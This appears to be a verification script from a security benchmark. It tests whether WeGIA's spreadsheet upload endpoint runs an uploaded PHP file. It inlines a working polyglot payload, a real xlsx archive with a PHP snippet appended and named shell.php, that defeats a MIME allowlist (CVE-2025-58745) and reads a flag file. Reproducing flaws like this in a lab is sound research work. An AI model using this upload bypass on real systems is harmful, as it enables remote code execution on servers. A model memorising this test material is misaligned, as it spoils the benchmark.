#!/usr/bin/env bash
# verify.sh --seed|--residual
# 0 = uploaded .php executed and echoed RUN_FLAG
# 10 = blocked / no flag   20 = env   30 = args
#
# Seed: plain PHP named shell.php (CVE-2025-22133). V0 accepts; V1 finfo rejects.
# Residual (inline): xlsx magic + same PHP body, still named .php (CVE-2025-58745).
# Both drive REAL WeGIA POST /html/socio/sistema/controller/controla_xlsx.php.
# Inline literals only; never reference heldout files.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

SVC="$VERSION"
PORT=""
for _ in $(seq 1 60); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
    port "$SVC" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]' || true)"
  if [[ -n "$PORT" ]]; then
    code="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 8 \
      "http://127.0.0.1:${PORT}/html/login.php" || true)"
    if [[ "$code" == "200" ]]; then
      break
    fi
  fi
  sleep 2
  PORT=""
done
[[ -n "$PORT" ]] || { echo "verify: no published ${SVC}:80 / login.php not ready" >&2; exit 20; }
export PCB_TARGET_PORT="$PORT"
export PCB_FLAG="${PCB_FLAG:-$RUN_FLAG}"

if [[ "$MODE" == "--seed" ]]; then
  "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json" || { echo "verify: original_poc failed" >&2; exit 20; }
else
  # residual CVE-2025-58745: V1 finfo allowlist only checks Excel MIME. A real
  # xlsx (ZIP/OOXML) prefix makes finfo report spreadsheetml.sheet; $extensao
  # is still "php"; move_uploaded_file writes tabelas/<uniqid>_shell.php; GET
  # executes the appended PHP. Inline only; no heldout files.
  "$PY" - "$WORK_DIR/cand.json" <<'PY'
import base64, io, json, sys, zipfile
php = b"<?php echo 'PCBEXEC:'.@file_get_contents('/flag/pcb_flag.txt'); ?>\n"
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("[Content_Types].xml", """<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>""")
    zf.writestr("_rels/.rels", """<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>""")
    zf.writestr("xl/workbook.xml", """<?xml version="1.0" encoding="UTF-8"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<sheets><sheet name="s" sheetId="1" r:id="rId1"/></sheets>
</workbook>""")
    zf.writestr("xl/_rels/workbook.xml.rels", """<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>""")
    zf.writestr("xl/worksheets/sheet1.xml", """<?xml version="1.0" encoding="UTF-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData/></worksheet>""")
payload = buf.getvalue() + php
open(sys.argv[1], "w").write(json.dumps({
    "probe_id": "cve-2025-58745-xlsx-magic-php",
    "mode": "xlsx_polyglot",
    "filename": "shell.php",
    "payload_b64": base64.b64encode(payload).decode("ascii"),
}) + "\n")
PY
fi

OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }

"$PY" - "$OUT" "$RUN_FLAG" "$MODE" "$PORT" <<'PY'
import json, sys
raw, flag, mode, port = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
try:
    d = json.loads(raw)
except Exception:
    sys.stderr.write("verify: non-JSON probe output\n%s\n" % raw[:400])
    sys.exit(20)
body = d.get("body") or d.get("fetched_body") or ""
err = d.get("error")
if err and flag not in body:
    el = str(err).lower()
    if any(x in el for x in ("connect", "refused", "timeout", "not found", "failed to")):
        sys.stderr.write("verify: probe error: %s\n" % str(err)[:300])
        sys.exit(20)
hit = bool(flag) and flag in body
print("mode=%s port=%s upload=%s fetch=%s hit=%s" % (
    mode.lstrip("-"), port, d.get("upload_status"), d.get("fetch_status"), hit))
print((body or "")[:500])
sys.exit(0 if hit else 10)
PY
